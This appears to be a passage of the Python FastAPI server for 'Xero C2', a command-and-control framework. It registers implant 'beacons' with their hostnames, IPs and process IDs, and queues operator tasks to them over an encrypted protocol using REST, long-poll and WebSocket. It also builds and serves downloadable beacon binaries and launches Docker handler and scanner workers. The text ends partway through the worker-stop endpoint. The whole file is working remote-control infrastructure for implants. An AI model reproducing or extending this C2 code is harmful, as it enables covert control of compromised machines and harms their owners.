from __future__ import annotations

import asyncio
import uuid
from contextlib import asynccontextmanager, suppress
from pathlib import Path
from secrets import compare_digest
from typing import Annotated

from fastapi import APIRouter, Depends, FastAPI, Header, HTTPException, Query, Request, WebSocket, status
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse, Response
from sqlalchemy import select
from sqlalchemy.orm import Session
from xero_common.database import session_factory_for_settings
from xero_common.models import utc_now
from xero_common.readiness import check_readiness
from xero_common.redis_bus import close_redis, get_redis_client, initialize_redis, publish_operator_event
from xero_common.security import (
    AuthTokenError,
    create_c2_access_token,
    decode_c2_access_token,
    generate_beacon_token,
    generate_opaque_token,
    hash_beacon_token,
    hash_opaque_token,
    verify_beacon_token,
)

from xero_c2.beacon_auth import beacon_auth_exception, bearer_token
from xero_c2.beacon_builds import (
    SUPPORTED_TARGETS,
    create_beacon_build,
    public_beacon_build,
    recent_builds,
    run_build_job,
    run_fake_build,
)
from xero_c2.beacon_liveness import (
    BEACON_EVENT_REASON_HEARTBEAT,
    BEACON_STATUS_ONLINE,
    apply_runtime_metadata,
    publish_beacon_event,
    record_status_transition,
    run_beacon_stale_monitor,
)
from xero_c2.beacon_longpoll import (
    BeaconLongPollManager,
    DuplicateLongPollError,
    update_beacon_longpoll_state,
)
from xero_c2.beacon_transport import BeaconTransportManager
from xero_c2.beacon_websocket import run_beacon_websocket
from xero_c2.config import get_settings
from xero_c2.infrastructure_workers import (
    WORKER_ORIGIN_C2_MANAGED,
    WORKER_ORIGIN_EMBEDDED,
    WORKER_STATUS_FAILED,
    WORKER_STATUS_OFFLINE,
    WORKER_STATUS_ONLINE,
    WORKER_STATUS_STARTING,
    WORKER_STATUS_STOPPING,
    ensure_embedded_workers,
    find_authenticated_worker,
    find_valid_pairing_token,
    issue_pairing_token,
    publish_worker_event,
    record_worker_event,
    run_worker_stale_monitor,
)
from xero_c2.models import Beacon, BeaconBuild, InfrastructureWorker, ProtocolSecurityEvent, Task
from xero_c2.protocol import (
    ACK,
    CURRENT_PROTOCOL_VERSION,
    FRAME_HEADER_LENGTH,
    HEARTBEAT,
    INTEGRITY_ALGORITHM,
    KEY_EXCHANGE_ALGORITHM,
    PAYLOAD_ENCRYPTION_ALGORITHM,
    PROTOCOL_ERROR,
    REGISTER,
    TASK_POLL,
    ProtocolError,
    decode_frame,
    private_key_public_b64,
)
from xero_c2.protocol_processing import (
    c2_protocol_private_key,
    encrypted_protocol_response,
    ensure_nonce_not_replayed,
    frame_metadata,
    process_protocol_frame,
    protocol_error_response,
    protocol_supported_versions,
    record_frame_receipt,
    record_protocol_error,
)
from xero_c2.provisioning import ProvisioningError, launch_worker, stop_worker
from xero_c2.realtime import (
    OperatorRealtimeHub,
    authenticate_websocket,
    close_forbidden,
    close_unauthorized,
    run_operator_websocket,
    websocket_origin_allowed,
)
from xero_c2.schemas import (
    BeaconBuildCreateRequest,
    BeaconBuildListResponse,
    BeaconBuildResponse,
    BeaconBuildTargetListResponse,
    BeaconBuildTargetResponse,
    BeaconHeartbeatRequest,
    BeaconHeartbeatResponse,
    BeaconListResponse,
    BeaconRegistrationRequest,
    BeaconRegistrationResponse,
    BeaconResponse,
    C2ConnectRequest,
    C2ConnectResponse,
    C2SessionResponse,
    InfrastructureWorkerListResponse,
    InfrastructureWorkerResponse,
    PairingTokenCreateRequest,
    PairingTokenCreateResponse,
    ProtocolInfoResponse,
    ProtocolSecurityEventListResponse,
    ProtocolSecurityEventResponse,
    TaskCreateRequest,
    TaskListResponse,
    TaskResponse,
    TaskStatus,
    TransportStatusResponse,
    WorkerHeartbeatRequest,
    WorkerHeartbeatResponse,
    WorkerLaunchRequest,
    WorkerLaunchResponse,
    WorkerRegistrationRequest,
    WorkerRegistrationResponse,
    WorkerStopResponse,
)
from xero_c2.task_queue import (
    TASK_STATUS_QUEUED,
    TaskQueueService,
    TaskQueueUnavailable,
    cancel_task,
    dispatch_next_task,
    encode_task_ack_frame,
    public_task,
    requeue_dispatched_task,
    task_delivery_payload,
    task_event_type,
    task_queue_unavailable_exception,
    validate_task_timeout,
)


def get_db_session():
    settings = get_settings()
    SessionFactory = session_factory_for_settings(settings)
    with SessionFactory() as session:
        yield session


DbSession = Annotated[Session, Depends(get_db_session)]


def liveness_payload() -> dict[str, str]:
    settings = get_settings()
    return {
        "status": "ok",
        "service": settings.service_name,
        "role": settings.service_role,
        "environment": settings.app_env,
    }


def public_beacon(beacon: Beacon) -> dict:
    return {
        "id": str(beacon.id),
        "machine_fingerprint_hash": beacon.machine_fingerprint_hash,
        "hostname": beacon.hostname,
        "os": beacon.os,
        "architecture": beacon.architecture,
        "internal_ip": beacon.internal_ip,
        "external_ip": beacon.external_ip,
        "pid": beacon.pid,
        "status": beacon.status,
        "protocol_version": beacon.protocol_version,
        "transport_mode": beacon.transport_mode,
        "transport_connected": beacon.transport_connected,
        "transport_last_seen": beacon.transport_last_seen.isoformat() if beacon.transport_last_seen else None,
        "first_seen": beacon.first_seen.isoformat(),
        "last_seen": beacon.last_seen.isoformat(),
    }


def public_worker(worker: InfrastructureWorker) -> dict:
    return {
        "id": str(worker.id),
        "kind": worker.kind,
        "name": worker.name,
        "origin": worker.origin,
        "status": worker.status,
        "endpoint": worker.endpoint,
        "capabilities": worker.capabilities or [],
        "capacity": worker.capacity,
        "current_load": worker.current_load,
        "version": worker.version,
        "last_seen": worker.last_seen.isoformat() if worker.last_seen else None,
        "managed_project": worker.managed_project,
        "managed_service": worker.managed_service,
        "managed_host_port": worker.managed_host_port,
        "last_error": worker.last_error,
        "created_at": worker.created_at.isoformat(),
        "updated_at": worker.updated_at.isoformat(),
    }


def public_protocol_security_event(event: ProtocolSecurityEvent) -> dict:
    return {
        "id": str(event.id),
        "beacon_id": str(event.beacon_id) if event.beacon_id else None,
        "event_type": event.event_type,
        "severity": event.severity,
        "message": event.message,
        "session_id": event.session_id,
        "nonce": event.nonce,
        "occurred_at": event.occurred_at.isoformat(),
    }


def beacon_build_artifact_path(build: BeaconBuild) -> Path | None:
    if not build.artifact_path:
        return None
    path = Path(build.artifact_path)
    return path if path.exists() and path.is_file() else None


async def publish_task_event(app: FastAPI, settings, event_type: str, task_payload: dict) -> None:
    redis_client = getattr(app.state, "redis_client", None)
    event = await publish_operator_event(
        redis_client,
        settings,
        event_type,
        data={"task": task_payload},
        scope={"beacon_id": task_payload["beacon_id"], "task_id": task_payload["id"]},
    )
    if redis_client is None:
        await app.state.operator_realtime_hub.broadcast(event)


def pairing_command(settings, *, kind: str, token: str, name: str) -> str:
    service = "beacon-handler" if kind == "beacon-handler" else "scanner"
    compose_file = "docker-compose.handler.yml" if kind == "beacon-handler" else "docker-compose.scanner.yml"
    return (
        f"C2_BASE_URL={settings.worker_connect_url} "
        f"WORKER_PAIRING_TOKEN={token} "
        f"WORKER_NAME=\"{name}\" "
        f"docker compose -f {compose_file} up -d --build {service}"
    )


def auth_exception() -> HTTPException:
    return HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Invalid or missing C2 authentication token",
        headers={"WWW-Authenticate": "Bearer"},
    )


def worker_auth_exception() -> HTTPException:
    return HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Invalid or missing worker token",
        headers={"WWW-Authenticate": "Bearer"},
    )


def reset_beacon_transport_connections(session: Session) -> None:
    beacons = session.execute(select(Beacon).where(Beacon.transport_connected.is_(True))).scalars()
    for beacon in beacons:
        beacon.transport_connected = False
        session.add(beacon)


def transport_mode_counts(session: Session) -> dict[str, int]:
    counts = {"long-poll": 0, "rest": 0, "websocket": 0}
    modes = session.execute(select(Beacon.transport_mode)).scalars()
    for mode in modes:
        counts[mode] = counts.get(mode, 0) + 1
    return counts


def validate_longpoll_frame_beacon(decoded, beacon_id: uuid.UUID) -> None:
    if decoded.message_type == REGISTER:
        raise ProtocolError("REGISTER_NOT_ALLOWED", "Long-poll frame endpoint requires an existing beacon")
    if decoded.payload.get("beacon_id") != str(beacon_id):
        raise ProtocolError(
            "BEACON_ID_MISMATCH",
            "Frame beacon_id does not match the authenticated beacon",
            status_code=status.HTTP_403_FORBIDDEN,
    )


async def attach_dispatched_task_to_ack(
    app: FastAPI,
    session: Session,
    settings,
    *,
    beacon_id: uuid.UUID | None,
    ack_payload: dict,
) -> dict | None:
    if beacon_id is None:
        return None
    task = await dispatch_next_task(
        session,
        settings,
        app.state.task_queue_service,
        getattr(app.state, "redis_client", None),
        beacon_id=beacon_id,
    )
    if task is None:
        return None
    task_payload = public_task(task)
    ack_payload["task"] = task_delivery_payload(task)
    return task_payload


async def build_next_longpoll_task_frame(app: FastAPI, settings, beacon_id: uuid.UUID) -> tuple[bytes, dict] | None:
    if not app.state.beacon_longpoll_manager.is_active(beacon_id):
        return None
    SessionFactory = session_factory_for_settings(settings)
    with SessionFactory() as session:
        beacon = session.get(Beacon, beacon_id)
        if beacon is None or not beacon.protocol_session_id or not beacon.protocol_peer_public_key_b64:
            return None
        task = await dispatch_next_task(
            session,
            settings,
            app.state.task_queue_service,
            getattr(app.state, "redis_client", None),
            beacon_id=beacon_id,
        )
        if task is None:
            return None
        try:
            frame = encode_task_ack_frame(settings, beacon, task, transport="long-poll")
        except ProtocolError:
            await requeue_dispatched_task(
                session,
                app.state.task_queue_service,
                getattr(app.state, "redis_client", None),
                task,
            )
            session.commit()
            return None
        task_payload = public_task(task)
        session.commit()
        return frame, task_payload


def encrypted_protocol_error_response(settings, decoded, exc: ProtocolError) -> Response:
    frame = encrypted_protocol_response(
        settings,
        decoded,
        PROTOCOL_ERROR,
        {"status": "error", "code": exc.code, "message": exc.message},
    )
    frame.status_code = exc.status_code
    return frame


def worker_bearer_token(authorization: str | None) -> str:
    scheme, _, token = (authorization or "").partition(" ")
    if scheme.lower() != "bearer" or not token:
        raise worker_auth_exception()
    return token


def authorize_c2_token(settings, authorization: str | None) -> None:
    scheme, _, token = (authorization or "").partition(" ")
    if scheme.lower() != "bearer" or not token:
        raise auth_exception()
    try:
        decode_c2_access_token(token, settings)
    except AuthTokenError:
        raise auth_exception() from None


def create_app() -> FastAPI:
    settings = get_settings()
    realtime_hub = OperatorRealtimeHub(settings)
    beacon_transport_manager = BeaconTransportManager(queue_size=settings.beacon_ws_send_queue_size)
    beacon_longpoll_manager = BeaconLongPollManager()
    task_queue_service = TaskQueueService(app_env=settings.app_env)

    @asynccontextmanager
    async def lifespan(app: FastAPI):
        await initialize_redis(app, settings)
        app.state.operator_realtime_hub = realtime_hub
        app.state.beacon_transport_manager = beacon_transport_manager
        app.state.beacon_longpoll_manager = beacon_longpoll_manager
        app.state.task_queue_service = task_queue_service
        stale_monitor_task: asyncio.Task[None] | None = None
        worker_monitor_task: asyncio.Task[None] | None = None
        SessionFactory = session_factory_for_settings(settings)
        with SessionFactory() as session:
            ensure_embedded_workers(session, settings)
            reset_beacon_transport_connections(session)
            session.commit()
        if settings.app_env.lower() != "test":
            await realtime_hub.start(getattr(app.state, "redis_client", None))
            stale_monitor_task = asyncio.create_task(run_beacon_stale_monitor(app, settings, public_beacon))
            worker_monitor_task = asyncio.create_task(run_worker_stale_monitor(app, settings, public_worker))
        try:
            yield
        finally:
            if stale_monitor_task is not None:
                stale_monitor_task.cancel()
                with suppress(asyncio.CancelledError):
                    await stale_monitor_task
            if worker_monitor_task is not None:
                worker_monitor_task.cancel()
                with suppress(asyncio.CancelledError):
                    await worker_monitor_task
            await beacon_transport_manager.close_all()
            await beacon_longpoll_manager.close_all()
            await realtime_hub.stop()
            await close_redis(app)

    app = FastAPI(title="Xero C2 API", version="0.1.0", lifespan=lifespan)
    app.state.operator_realtime_hub = realtime_hub
    app.state.beacon_transport_manager = beacon_transport_manager
    app.state.beacon_longpoll_manager = beacon_longpoll_manager
    app.state.task_queue_service = task_queue_service

    app.add_middleware(
        CORSMiddleware,
        allow_origins=[settings.frontend_origin],
        allow_credentials=True,
        allow_methods=["*"],
        allow_headers=["*"],
    )

    @app.exception_handler(Exception)
    async def unhandled_exception_handler(_, exc: Exception) -> JSONResponse:
        return JSONResponse(
            status_code=500,
            content={"detail": "Internal server error", "error": exc.__class__.__name__},
        )

    @app.get("/health", tags=["health"])
    def health() -> dict[str, str]:
        return liveness_payload()

    @app.get("/ready", tags=["health"])
    def ready() -> JSONResponse:
        report = check_readiness(settings)
        status_code = 200 if report["status"] == "ready" else 503
        return JSONResponse(status_code=status_code, content=report)

    @app.websocket("/ws/operator")
    async def operator_websocket(websocket: WebSocket) -> None:
        if not websocket_origin_allowed(websocket, settings):
            await close_forbidden(websocket)
            return

        authenticated = authenticate_websocket(websocket, settings)
        if authenticated is None:
            await close_unauthorized(websocket)
            return

        principal, accepted_protocol = authenticated
        await run_operator_websocket(
            websocket,
            hub=websocket.app.state.operator_realtime_hub,
            principal=principal,
            accepted_protocol=accepted_protocol,
        )

    @app.websocket("/ws/beacon")
    async def beacon_websocket(websocket: WebSocket) -> None:
        await run_beacon_websocket(websocket, settings=settings, public_beacon=public_beacon)

    api_router = APIRouter(prefix=settings.api_v1_prefix)

    @api_router.post("/c2/connect", response_model=C2ConnectResponse, tags=["c2"])
    def connect_c2(payload: C2ConnectRequest) -> C2ConnectResponse:
        if not compare_digest(payload.password, settings.c2_connect_password):
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Invalid C2 connection password",
                headers={"WWW-Authenticate": "Bearer"},
            )

        token, expires_at = create_c2_access_token(settings)
        return C2ConnectResponse(
            access_token=token,
            expires_at=expires_at,
            service=settings.service_name,
            service_role=settings.service_role,
        )

    @api_router.get("/c2/session", response_model=C2SessionResponse, tags=["c2"])
    def c2_session(authorization: Annotated[str | None, Header()] = None) -> C2SessionResponse:
        authorize_c2_token(settings, authorization)
        return C2SessionResponse(service=settings.service_name, service_role=settings.service_role, status="connected")

    @api_router.get("/transport", response_model=TransportStatusResponse, tags=["transport"])
    def transport_status(
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> TransportStatusResponse:
        authorize_c2_token(settings, authorization)
        return TransportStatusResponse(
            active_websocket_connections=app.state.beacon_transport_manager.active_count,
            active_longpoll_requests=app.state.beacon_longpoll_manager.active_count,
            transport_mode_counts=transport_mode_counts(session),
            websocket_send_queue_size=settings.beacon_ws_send_queue_size,
            websocket_registration_timeout_seconds=settings.beacon_ws_registration_timeout_seconds,
            websocket_heartbeat_timeout_seconds=settings.beacon_ws_heartbeat_timeout_seconds,
            websocket_ping_interval_seconds=settings.beacon_ws_ping_interval_seconds,
            websocket_ping_timeout_seconds=settings.beacon_ws_ping_timeout_seconds,
            websocket_max_message_bytes=settings.beacon_ws_max_message_bytes,
            longpoll_timeout_seconds=settings.beacon_longpoll_timeout_seconds,
            longpoll_max_frame_bytes=settings.beacon_longpoll_max_frame_bytes,
        )

    @api_router.get("/protocol", response_model=ProtocolInfoResponse, tags=["protocol"])
    def protocol_info(authorization: Annotated[str | None, Header()] = None) -> ProtocolInfoResponse:
        authorize_c2_token(settings, authorization)
        private_key = c2_protocol_private_key(settings)
        return ProtocolInfoResponse(
            current_version=CURRENT_PROTOCOL_VERSION,
            supported_versions=protocol_supported_versions(settings),
            key_exchange=KEY_EXCHANGE_ALGORITHM,
            encryption=PAYLOAD_ENCRYPTION_ALGORITHM,
            integrity=INTEGRITY_ALGORITHM,
            frame_header_length=FRAME_HEADER_LENGTH,
            max_frame_bytes=settings.protocol_max_frame_bytes,
            c2_public_key_b64=private_key_public_b64(private_key),
            frame_harness_enabled=settings.protocol_frame_harness_enabled,
        )

    @api_router.get(
        "/security/events",
        response_model=ProtocolSecurityEventListResponse,
        tags=["security"],
    )
    def list_protocol_security_events(
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
        limit: Annotated[int, Query(ge=1, le=100)] = 25,
    ) -> ProtocolSecurityEventListResponse:
        authorize_c2_token(settings, authorization)
        events = session.execute(
            select(ProtocolSecurityEvent).order_by(ProtocolSecurityEvent.occurred_at.desc()).limit(limit)
        ).scalars()
        return ProtocolSecurityEventListResponse(
            items=[ProtocolSecurityEventResponse(**public_protocol_security_event(event)) for event in events]
        )

    @api_router.get(
        "/beacon-builds/targets",
        response_model=BeaconBuildTargetListResponse,
        tags=["beacon-builds"],
    )
    def list_beacon_build_targets(
        authorization: Annotated[str | None, Header()] = None,
    ) -> BeaconBuildTargetListResponse:
        authorize_c2_token(settings, authorization)
        return BeaconBuildTargetListResponse(
            items=[BeaconBuildTargetResponse(**target) for target in SUPPORTED_TARGETS]
        )

    @api_router.get("/beacon-builds", response_model=BeaconBuildListResponse, tags=["beacon-builds"])
    def list_beacon_builds(
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
        limit: Annotated[int, Query(ge=1, le=100)] = 25,
    ) -> BeaconBuildListResponse:
        authorize_c2_token(settings, authorization)
        return BeaconBuildListResponse(
            items=[BeaconBuildResponse(**public_beacon_build(build)) for build in recent_builds(session, limit)]
        )

    @api_router.post("/beacon-builds", response_model=BeaconBuildResponse, tags=["beacon-builds"])
    async def create_go_beacon_build(
        payload: BeaconBuildCreateRequest,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> BeaconBuildResponse:
        authorize_c2_token(settings, authorization)
        if not settings.beacon_builds_enabled:
            raise HTTPException(status_code=status.HTTP_503_SERVICE_UNAVAILABLE, detail="Beacon builds are disabled")

        private_key = c2_protocol_private_key(settings)
        build = create_beacon_build(
            session,
            payload,
            c2_public_key_b64=private_key_public_b64(private_key),
        )
        session.commit()
        session.refresh(build)

        if settings.app_env.lower() == "test":
            run_fake_build(session, settings, build, output_name=payload.output_name)
            session.commit()
            session.refresh(build)
        else:
            build_id = build.id
            output_name = payload.output_name
            asyncio.create_task(asyncio.to_thread(run_build_job, settings, build_id, output_name=output_name))

        return BeaconBuildResponse(**public_beacon_build(build))

    @api_router.get("/beacon-builds/{build_id}", response_model=BeaconBuildResponse, tags=["beacon-builds"])
    def get_beacon_build(
        build_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> BeaconBuildResponse:
        authorize_c2_token(settings, authorization)
        build = session.get(BeaconBuild, build_id)
        if build is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon build not found")
        return BeaconBuildResponse(**public_beacon_build(build))

    @api_router.get("/beacon-builds/{build_id}/artifact", response_model=None, tags=["beacon-builds"])
    def download_beacon_build_artifact(
        build_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> FileResponse:
        authorize_c2_token(settings, authorization)
        build = session.get(BeaconBuild, build_id)
        if build is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon build not found")
        if build.status != "succeeded":
            raise HTTPException(status_code=status.HTTP_409_CONFLICT, detail="Beacon build artifact is not ready")
        artifact_path = beacon_build_artifact_path(build)
        if artifact_path is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon build artifact not found")
        return FileResponse(
            artifact_path,
            media_type="application/octet-stream",
            filename=build.artifact_filename or artifact_path.name,
        )

    @api_router.post("/protocol/frames", response_model=None, tags=["protocol"])
    async def submit_protocol_frame(
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> Response | JSONResponse:
        authorize_c2_token(settings, authorization)
        if not settings.protocol_frame_harness_enabled:
            raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Protocol frame harness is disabled")

        raw_frame = await request.body()
        metadata = frame_metadata(raw_frame)
        try:
            ensure_nonce_not_replayed(session, metadata)
            decoded = decode_frame(
                raw_frame,
                private_key=c2_protocol_private_key(settings),
                supported_versions=protocol_supported_versions(settings),
                max_frame_bytes=settings.protocol_max_frame_bytes,
            )
            beacon_id, ack_payload = process_protocol_frame(
                session,
                settings,
                decoded,
                transport_mode="rest",
                transport_connected=False,
            )
            dispatched_task_payload = None
            if decoded.message_type == TASK_POLL:
                dispatched_task_payload = await attach_dispatched_task_to_ack(
                    request.app,
                    session,
                    settings,
                    beacon_id=beacon_id,
                    ack_payload=ack_payload,
                )
            record_frame_receipt(session, decoded, beacon_id=beacon_id)
            session.commit()
            if beacon_id is not None and decoded.message_type == REGISTER:
                beacon = session.get(Beacon, beacon_id)
                if beacon is not None:
                    await publish_beacon_event(
                        request.app,
                        settings,
                        str(ack_payload.get("event_type", "beacon.registered")),
                        public_beacon(beacon),
                    )
            if dispatched_task_payload is not None:
                await publish_task_event(
                    request.app,
                    settings,
                    task_event_type(dispatched_task_payload["status"]),
                    dispatched_task_payload,
                )
            if ack_payload.get("task_event_type") and isinstance(ack_payload.get("task"), dict):
                await publish_task_event(
                    request.app,
                    settings,
                    str(ack_payload["task_event_type"]),
                    ack_payload["task"],
                )
            return encrypted_protocol_response(settings, decoded, ACK, ack_payload)
        except ProtocolError as exc:
            record_protocol_error(session, exc, metadata)
            session.commit()
            return protocol_error_response(exc)
        except TaskQueueUnavailable:
            session.rollback()
            raise task_queue_unavailable_exception() from None

    @api_router.get(
        "/infrastructure/workers",
        response_model=InfrastructureWorkerListResponse,
        tags=["infrastructure"],
    )
    def list_infrastructure_workers(
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> InfrastructureWorkerListResponse:
        authorize_c2_token(settings, authorization)
        ensure_embedded_workers(session, settings)
        session.commit()
        workers = session.execute(
            select(InfrastructureWorker).order_by(
                InfrastructureWorker.kind.asc(),
                InfrastructureWorker.origin.asc(),
                InfrastructureWorker.name.asc(),
            )
        ).scalars()
        return InfrastructureWorkerListResponse(
            items=[InfrastructureWorkerResponse(**public_worker(worker)) for worker in workers]
        )

    @api_router.post(
        "/infrastructure/pairing-tokens",
        response_model=PairingTokenCreateResponse,
        tags=["infrastructure"],
    )
    def create_worker_pairing_token(
        payload: PairingTokenCreateRequest,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> PairingTokenCreateResponse:
        authorize_c2_token(settings, authorization)
        pairing_token, plaintext = issue_pairing_token(session, settings, kind=payload.kind, name=payload.name)
        record_worker_event(
            session,
            None,
            kind=payload.kind,
            event_type="worker.pairing_token.created",
            message=f"Pairing token created for {payload.name}.",
        )
        session.commit()
        session.refresh(pairing_token)
        return PairingTokenCreateResponse(
            id=str(pairing_token.id),
            kind=pairing_token.kind,
            name=pairing_token.name,
            pairing_token=plaintext,
            expires_at=pairing_token.expires_at,
            command=pairing_command(settings, kind=pairing_token.kind, token=plaintext, name=pairing_token.name),
        )

    @api_router.post(
        "/infrastructure/workers/register",
        response_model=WorkerRegistrationResponse,
        tags=["infrastructure"],
    )
    async def register_infrastructure_worker(
        payload: WorkerRegistrationRequest,
        request: Request,
        session: DbSession,
    ) -> WorkerRegistrationResponse:
        pairing_token = find_valid_pairing_token(session, payload.pairing_token)
        if pairing_token is None or pairing_token.kind != payload.kind:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Invalid or expired worker pairing token",
                headers={"WWW-Authenticate": "Bearer"},
            )

        now = utc_now()
        worker = session.get(InfrastructureWorker, pairing_token.worker_id) if pairing_token.worker_id else None
        if worker is None:
            worker = InfrastructureWorker(kind=payload.kind, name=payload.name, origin="external")
        worker.name = payload.name
        worker.kind = payload.kind
        worker.status = WORKER_STATUS_ONLINE
        worker.endpoint = payload.endpoint
        worker.capabilities = payload.capabilities
        worker.capacity = payload.capacity
        worker.current_load = payload.current_load
        worker.version = payload.version
        worker.last_seen = now
        worker.last_error = None
        worker_token = generate_opaque_token()
        worker.worker_token_hash = hash_opaque_token(worker_token)
        session.add(worker)
        session.flush()
        pairing_token.worker_id = worker.id
        pairing_token.used_at = now
        session.add(pairing_token)
        record_worker_event(
            session,
            worker,
            kind=worker.kind,
            event_type="worker.registered",
            message=f"{worker.name} registered with C2.",
            occurred_at=now,
        )
        session.commit()
        session.refresh(worker)

        worker_payload = public_worker(worker)
        await publish_worker_event(request.app, settings, "worker.registered", worker_payload)
        return WorkerRegistrationResponse(
            worker_id=str(worker.id),
            worker_token=worker_token,
            heartbeat_interval_seconds=settings.worker_heartbeat_interval_seconds,
            worker=InfrastructureWorkerResponse(**worker_payload),
        )

    @api_router.post(
        "/infrastructure/workers/{worker_id}/heartbeat",
        response_model=WorkerHeartbeatResponse,
        tags=["infrastructure"],
    )
    async def heartbeat_infrastructure_worker(
        worker_id: uuid.UUID,
        payload: WorkerHeartbeatRequest,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> WorkerHeartbeatResponse:
        worker = find_authenticated_worker(session, worker_id, worker_bearer_token(authorization))
        if worker is None:
            raise worker_auth_exception()

        old_status = worker.status
        worker.status = WORKER_STATUS_ONLINE
        worker.endpoint = payload.endpoint
        worker.capabilities = payload.capabilities
        worker.capacity = payload.capacity
        worker.current_load = payload.current_load
        worker.version = payload.version
        worker.last_seen = utc_now()
        worker.last_error = None
        session.add(worker)
        if old_status != WORKER_STATUS_ONLINE:
            record_worker_event(
                session,
                worker,
                kind=worker.kind,
                event_type="worker.status.changed",
                message=f"{worker.name} changed from {old_status} to online.",
            )
        session.commit()
        session.refresh(worker)

        worker_payload = public_worker(worker)
        await publish_worker_event(request.app, settings, "worker.heartbeat", worker_payload)
        if old_status != WORKER_STATUS_ONLINE:
            await publish_worker_event(request.app, settings, "worker.status.changed", worker_payload)
        return WorkerHeartbeatResponse(
            status=worker.status,
            heartbeat_interval_seconds=settings.worker_heartbeat_interval_seconds,
            worker=InfrastructureWorkerResponse(**worker_payload),
        )

    @api_router.post(
        "/infrastructure/workers/launch",
        response_model=WorkerLaunchResponse,
        tags=["infrastructure"],
    )
    async def launch_infrastructure_worker(
        payload: WorkerLaunchRequest,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> WorkerLaunchResponse:
        authorize_c2_token(settings, authorization)
        port_owner = session.execute(
            select(InfrastructureWorker).where(
                InfrastructureWorker.managed_host_port == payload.host_port,
                InfrastructureWorker.status.notin_([WORKER_STATUS_FAILED, WORKER_STATUS_OFFLINE]),
            )
        ).scalar_one_or_none()
        if port_owner is not None:
            raise HTTPException(status_code=status.HTTP_409_CONFLICT, detail="Host port is already assigned")

        worker = InfrastructureWorker(
            kind=payload.kind,
            name=payload.name,
            origin=WORKER_ORIGIN_C2_MANAGED,
            status=WORKER_STATUS_STARTING,
            capacity=1,
            current_load=0,
            managed_service="beacon-handler" if payload.kind == "beacon-handler" else "scanner",
            managed_compose_file=(
                "docker-compose.handler.yml" if payload.kind == "beacon-handler" else "docker-compose.scanner.yml"
            ),
            managed_host_port=payload.host_port,
        )
        session.add(worker)
        session.flush()
        pairing_token, plaintext = issue_pairing_token(
            session,
            settings,
            kind=payload.kind,
            name=payload.name,
            worker=worker,
        )
        record_worker_event(
            session,
            worker,
            kind=worker.kind,
            event_type="worker.launch.requested",
            message=f"Launch requested for {worker.name}.",
        )
        session.commit()
        session.refresh(worker)

        try:
            project_name, endpoint = launch_worker(
                settings,
                kind=worker.kind,
                name=worker.name,
                worker_id=worker.id,
                pairing_token=plaintext,
                host_port=payload.host_port,
            )
            worker.managed_project = project_name
            worker.endpoint = endpoint
            worker.status = WORKER_STATUS_STARTING
            worker.last_error = None
            record_worker_event(
                session,
                worker,
                kind=worker.kind,
                event_type="worker.launch.started",
                message=f"Docker Compose project {project_name} started for {worker.name}.",
            )
            session.add(worker)
            session.commit()
        except ProvisioningError as exc:
            worker.status = WORKER_STATUS_FAILED
            worker.last_error = str(exc)
            record_worker_event(
                session,
                worker,
                kind=worker.kind,
                event_type="worker.launch.failed",
                message=str(exc),
            )
            session.add(worker)
            session.commit()
            await publish_worker_event(request.app, settings, "worker.status.changed", public_worker(worker))
            raise HTTPException(status_code=status.HTTP_503_SERVICE_UNAVAILABLE, detail=str(exc)) from exc

        session.refresh(worker)
        worker_payload = public_worker(worker)
        await publish_worker_event(request.app, settings, "worker.launch.started", worker_payload)
        return WorkerLaunchResponse(worker=InfrastructureWorkerResponse(**worker_payload))

    @api_router.post(
        "/infrastructure/workers/{worker_id}/stop",
        response_model=WorkerStopResponse,
        tags=["infrastructure"],
    )
    async def stop_infrastructure_worker(
        worker_id: uuid.UUID,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> WorkerStopResponse:
        authorize_c2_token(settings, authorization)
        worker = session.get(InfrastructureWorker, worker_id)
        if worker is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Worker not found")
        if worker.origin == WORKER_ORIGIN_EMBEDDED:
            raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail="Embedded workers cannot be stopped")
        if worker.origin != WORKER_ORIGIN_C2_MANAGED or not worker.managed_project:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Only C2-managed workers can be stopped",
            )

        worker.status = WORKER_STATUS_STOPPING
        session.add(worker)
        session.commit()
        try:
            stop_worker(settings, kind=worker.kind, project_name=worker.managed_project)
            worker.status = WORKER_STATUS_OFFLINE
            worker.last_error = None
            record_worker_event(
                session,
                worker,
                kind=worker.kind,
                event_type="worker.stopped",
                message=f"{worker.name} was stopped by operator request.",
            )
            session.add(worker)
            session.commit()
        except ProvisioningError as exc:
            worker.status = WORKER_STATUS_FAILED
            worker.last_error = str(exc)
            record_worker_event(
                session,
                worker,
                kind=worker.kind,
                event_type="worker.stop.failed",
                message=str(exc),
            )
            session.add(worker)
            session.commit()
            await publish_worker_event(request.app, settings, "worker.status.changed", public_worker(worker))
            raise HTTPException(status_code=status.HTTP_503_SERVICE_UNAVAILABLE, detail=str(exc)) from exc

        session.refresh(worker)
        worker_payload = public_worker(worker)
        await publish_worker_event(request.app, settings, "worker.status.changed", worker_payload)
